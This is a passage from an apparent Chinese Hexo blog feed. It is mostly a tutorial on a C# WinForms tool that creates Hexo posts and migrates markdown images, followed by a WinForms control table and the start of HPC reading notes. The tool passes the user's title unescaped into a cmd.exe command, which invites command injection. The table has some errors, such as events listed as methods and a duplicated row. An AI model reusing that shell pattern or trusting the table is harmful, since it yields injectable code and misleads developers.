<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">&#123;</span><br><span class="line">    Dock = DockStyle.Top,</span><br><span class="line">    AutoSize = <span class="literal">true</span>,</span><br><span class="line">    FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">    WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">    Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 创建加号按钮</span></span><br><span class="line">addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建减号按钮</span></span><br><span class="line">removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line"><span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">........................................................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后就是核心的<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数实现。需要注意的是边界条件的处理，我们在只有一个输入框时可以不显示<code>-</code>按钮，以防止越界。而且如果直接往<strong>inputPanel</strong>(也就是调用者的<strong>tagsPanel</strong>)中加TextBox，会导致<code>+-</code>不显示在所有输入框之后，比较不美观。所以我们可以每次增加输入框时，先删去原来的<code>+-</code>按钮，待TextBox增加入控件后，最后再次添加按钮回来。这样就能确保按钮位置正确。这里抽象出了<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数是为了tag和category的处理都能够复用。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">    TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">        Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">    textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">    <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">        inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">    inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">    inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">        inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">        TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">        <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">            textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">            inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127234914952.png"
                      class=""
                >
<p>获取用户输入的Tags和Category也比较方便。能够直接返回一个string类型的数组。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">        &#123;</span><br><span class="line">            tags.Add(textBox.Text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后可以添加一个提交按钮，来触发核心的文件处理函数。按钮点击后就可以隐藏，避免多次点击。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建确定按钮</span></span><br><span class="line">Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">    Width = <span class="number">100</span>,</span><br><span class="line">    Height = <span class="number">40</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">    <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非空检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h5 id="消息窗口实现"><a href="#消息窗口实现" class="headerlink" title="消息窗口实现"></a><strong>消息窗口实现</strong></h5><p>实现了上述的UI以后，界面还是有点空旷，那么其实我们可以把一些执行中的过程信息显示出来，来丰富界面，实现如下：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 Process 信息框</span></span><br><span class="line">processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">&#123;</span><br><span class="line">    Multiline = <span class="literal">true</span>,</span><br><span class="line">    Width = <span class="number">600</span>,</span><br><span class="line">    Height = <span class="number">200</span>,</span><br><span class="line">    ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">    ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">    WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">    Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">&#125;;</span><br><span class="line">.......................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">    processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">    processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">    processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后我们调用<strong>AppendMessage</strong>就可以直接把消息显示到屏幕上了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250128001534976.png"
                      class=""
                >
<h5 id="文件具体处理实现"><a href="#文件具体处理实现" class="headerlink" title="文件具体处理实现"></a>文件具体处理实现</h5><p>首先是要利用hexo的new命令来新建一个文章的架构，比较麻烦的是切换到Hexo的目录。首先我们要先从设置中读取出来，然后得截取出盘符，因为在windows上不能直接跨盘符用cd切换目录。最后才能执行<code>hexo new title</code>。这里用异步函数是为了在消息框显示内容更有层次感。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">     settings.LoadSettings();</span><br><span class="line">     <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">     <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">     <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">     <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">     AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">     <span class="keyword">try</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">         ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">         &#123;</span><br><span class="line">             FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">             Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">             CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">             UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">             RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">             RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">             <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line"></span><br><span class="line">             process.WaitForExit();</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">             &#123;</span><br><span class="line">                 MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                 AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                 <span class="keyword">return</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                 AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">     &#123;</span><br><span class="line">         MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后是根据提供的几个参数来构建hexo的文章的YAML前言部分。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 tags</span></span><br><span class="line"><span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 categories</span></span><br><span class="line"><span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>最后就是将所有markdown文件中出现的图片通过正则匹配提取路径，并复制到指定目录，然后将图片语法替换成hexo能够解析的语法。最后将内容合并，写回hexo文章的markdown文件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line"><span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">    <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">    imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">    imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">    <span class="comment">// 提取图片文件名</span></span><br><span class="line">    <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">            <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">            </span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">            <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">            fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        AppendMessage(<span class="string">$&quot;[-] Image not found: <span class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">        <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将内容合并</span></span><br><span class="line"><span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line"><span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br></pre></td></tr></table></figure></div>
<p>这样以后，基本功能就差不多实现了，这里只对redefine这个主题进行了适配，别的Hexo主题可能需要调整细节。更多的设置功能也可以后续慢慢的添加进去。</p>
<h4 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h4><div class="table-container">
<table>
<thead>
<tr>
<th>控件</th>
<th>常用属性</th>
<th>常用方法</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Label</strong></td>
<td>- <code>Text</code>：显示的文本 <br />- <code>TextAlign</code>：文本对齐方式 <br />- <code>Font</code>：字体 <br />- <code>ForeColor</code>：文本颜色 <br />- <code>BackColor</code>：背景颜色 <br />- <code>AutoSize</code>：是否自动调整大小</td>
<td>- <code>SetBounds</code>：设置控件的位置和大小 <br />- <code>Focus</code>：设置焦点</td>
</tr>
<tr>
<td><strong>Button</strong></td>
<td>- <code>Text</code>：按钮文本 <br />- <code>BackColor</code>：按钮背景色 <br />- <code>ForeColor</code>：按钮文字颜色 <br />- <code>Enabled</code>：是否启用按钮 <br />- <code>Size</code>：按钮大小 <br />- <code>Tag</code>：关联的控件</td>
<td>- <code>PerformClick()</code>：模拟点击按钮 <br />- <code>Click</code>：按钮点击事件</td>
</tr>
<tr>
<td><strong>TextBox</strong></td>
<td>- <code>Text</code>：输入文本 <br />- <code>TextAlign</code>：文本对齐方式 <br />- <code>Multiline</code>：是否多行文本框<br /> - <code>MaxLength</code>：最大字符长度 <br />- <code>PasswordChar</code>：密码字符</td>
<td>- <code>Clear()</code>：清除文本 <br />- <code>Focus()</code>：设置焦点 <br />- <code>SelectAll()</code>：全选文本 <br />- <code>Paste()</code>：粘贴</td>
</tr>
<tr>
<td><strong>ComboBox</strong></td>
<td>- <code>Items</code>：项集合 <br />- <code>SelectedItem</code>：选中的项 <br />- <code>SelectedIndex</code>：选中的索引<br /> - <code>DropDownStyle</code>：下拉框风格（如 <code>DropDownList</code>）</td>
<td>- <code>Add()</code>：添加项 <br />- <code>Remove()</code>：移除项 <br />- <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>ListBox</strong></td>
<td>- <code>Items</code>：项集合 <br />- <code>SelectedItem</code>：选中的项 <br />- <code>SelectedIndex</code>：选中的索引 <br />- <code>MultiColumn</code>：是否多列显示</td>
<td>- <code>Add()</code>：添加项<br /> - <code>Remove()</code>：移除项<br /> - <code>Clear()</code>：清空项<br /> - <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>CheckBox</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本 <br />- <code>AutoSize</code>：是否自动调整大小 <br />- <code>CheckState</code>：勾选状态（<code>Checked</code>、<code>Unchecked</code>）</td>
<td>- <code>PerformClick()</code>：模拟点击 <br />- <code>CheckedChanged</code>：选中状态变化事件</td>
</tr>
<tr>
<td><strong>RadioButton</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本 <br />- <code>GroupName</code>：分组名称，防止多个单选框互相独立</td>
<td>- <code>CheckedChanged</code>：选中状态变化事件<br />- <code>PerformClick()</code>：模拟点击</td>
</tr>
<tr>
<td><strong>Panel</strong></td>
<td>- <code>BackColor</code>：背景色 <br />- <code>Dock</code>：停靠方式（如 <code>DockStyle.Fill</code>）<br />- <code>Padding</code>：控件的内边距</td>
<td>- <code>Controls.Add()</code>：向面板添加控件 <br />- <code>Controls.Remove()</code>：移除控件</td>
</tr>
<tr>
<td><strong>PictureBox</strong></td>
<td>- <code>Image</code>：显示的图片 <br />- <code>SizeMode</code>：图片显示方式（如 <code>StretchImage</code>、<code>Zoom</code>） <br />- <code>BackColor</code>：背景颜色</td>
<td>- <code>Load()</code>：加载图片 <br />- <code>Refresh()</code>：重绘图片</td>
</tr>
<tr>
<td><strong>RichTextBox</strong></td>
<td>- <code>Text</code>：文本内容 <br />- <code>Font</code>：字体 <br />- <code>SelectionStart</code>：选中文本的起始位置<br />- <code>SelectionLength</code>：选中文本的长度</td>
<td>- <code>AppendText()</code>：追加文本 <br />- <code>Clear()</code>：清空文本 <br />- <code>Find()</code>：查找文本</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：选定的日期时间 <br />- <code>Format</code>：日期时间格式 <br />- <code>MinDate</code>：最小日期 <br />- <code>MaxDate</code>：最大日期</td>
<td>- <code>CloseUp()</code>：关闭下拉日历 <br />- <code>DropDown()</code>：展开下拉日历</td>
</tr>
<tr>
<td><strong>TrackBar</strong></td>
<td>- <code>Minimum</code>：最小值 <br />- <code>Maximum</code>：最大值 <br />- <code>Value</code>：当前值 <br />- <code>TickFrequency</code>：刻度频率</td>
<td>- <code>ValueChanged</code>：值变化事件</td>
</tr>
<tr>
<td><strong>TabControl</strong></td>
<td>- <code>TabPages</code>：Tab页集合 <br />- <code>SelectedTab</code>：当前选中的Tab页 <br />- <code>Alignment</code>：Tab的对齐方式</td>
<td>- <code>SelectTab()</code>：切换选中的Tab</td>
</tr>
<tr>
<td><strong>ToolTip</strong></td>
<td>- <code>ToolTipTitle</code>：工具提示标题 <br />- <code>IsBalloon</code>：是否气泡提示 <br />- <code>InitialDelay</code>：首次显示延迟</td>
<td>- <code>SetToolTip()</code>：为控件设置工具提示</td>
</tr>
<tr>
<td><strong>TreeView</strong></td>
<td>- <code>Nodes</code>：树节点集合 <br />- <code>SelectedNode</code>：选中的节点 <br />- <code>CheckBoxes</code>：是否启用复选框</td>
<td>- <code>ExpandAll()</code>：展开所有节点 <br />- <code>CollapseAll()</code>：折叠所有节点</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：当前选中的日期时间 <br />- <code>Format</code>：日期时间显示格式</td>
<td>- <code>CloseUp()</code>：关闭日历窗口 <br />- <code>DropDown()</code>：打开日历窗口</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>Development</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Development</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Algorithmica-HPC研读记录1</title>
    <url>/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h1 id="Algorithmica-HPC研读记录（1-3章）"><a href="#Algorithmica-HPC研读记录（1-3章）" class="headerlink" title="Algorithmica HPC研读记录（1-3章）"></a>Algorithmica HPC研读记录（1-3章）</h1><h3 id="一、复杂性模型"><a href="#一、复杂性模型" class="headerlink" title="一、复杂性模型"></a>一、复杂性模型</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><h5 id="传统复杂性理论"><a href="#传统复杂性理论" class="headerlink" title="传统复杂性理论"></a>传统复杂性理论</h5><blockquote>
<p>To estimate the real running time of a program, you need to sum all latencies for its executed instructions and divide it by the <em>clock frequency</em>, that is, the number of cycles a particular CPU does per second.</p>
</blockquote>
<p>为了计算实际的程序运行时间，需要把所有指令的延迟都累加起来。“以时钟频率划分”指的是通过将程序执行过程中所有指令的延迟时间（latencies）除以CPU的时钟频率，来估算程序的实际运行时间。</p>
<ol>
<li><strong>时钟频率（Clock Frequency）</strong>： 时钟频率是指CPU每秒钟能够执行多少个时钟周期，单位通常是赫兹（Hz）。例如，如果一个CPU的时钟频率是 3 GHz，那就意味着它每秒钟可以执行 30 亿个时钟周期。</li>
<li><strong>延迟（Latency）</strong>： 每条指令在执行时都有一个延迟，表示从开始执行到完成所需的时间。这个延迟通常是以时钟周期为单位的。例如，如果某条指令需要 5 个时钟周期来执行，那么它的延迟就是 5 个周期。</li>
<li><strong>以时钟频率划分的意思</strong>： 当你想要计算程序的总运行时间时，你需要将所有指令的延迟加起来，得到总的延迟周期数。然后，为了将这个延迟周期转换为时间，你就需要将总的延迟周期数除以时钟频率。这是因为时钟频率告诉你 CPU 每秒钟执行多少个时钟周期，从而你可以通过除法将延迟周期转换为实际的时间（单位为秒）。</li>
</ol>
